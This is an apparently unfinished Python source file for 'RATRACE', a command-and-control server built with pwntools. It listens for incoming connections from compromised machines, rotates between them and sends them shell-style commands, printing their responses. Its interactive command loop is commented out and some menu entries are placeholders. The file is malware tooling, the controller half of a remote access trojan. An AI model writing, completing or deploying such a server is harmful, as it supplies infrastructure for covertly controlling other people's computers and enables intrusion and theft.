import socket
import threading
from pwn import *

class C2Server:
	def __init__(self, host='0.0.0.0', port=5555):
		self.host = host
		self.port = port
		self.clients = []
		self.current_client_index = 0

	def start(self):
		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server.bind((self.host, self.port))
		self.server.listen(10)
		status = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')

		while True:
			client_socket, addr = self.server.accept()
			log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
			status.success()
			self.clients.append(client_socket)

	def select_client(self):
		if not self.clients:
			return None
		self.current_client_index = (self.current_client_index + 1) % len(self.clients)
		return self.clients[self.current_client_index]

	def send_command(self, command):
		client = self.select_client()
		if not client:
			log.info("[!] No active clients")
			return
		if command.strip() == "":
			return
		if command == "exit":
			client.send(command.encode())
			return
		try:
			client.send(command.encode())
			response = client.recv(4096).decode()
			log.info(response)
		except Exception as e:
			log.info(f"[!] Error: {e}")
			self.clients.remove(client)


if __name__ == "__main__":
	items = ["Start Server","option2", "option3"]
	while True:
		choice = options('Welcome to RATRACE - Make your Selection', items)
		if choice == 0:
			server = C2Server()
			# Start server in separate thread
			server_thread = threading.Thread(target=server.start)
			server_thread.daemon = True
			server_thread.start()
			items[0] = "Stop Server"

		#command = str_input('C2> ')
		#server.send_command(command)
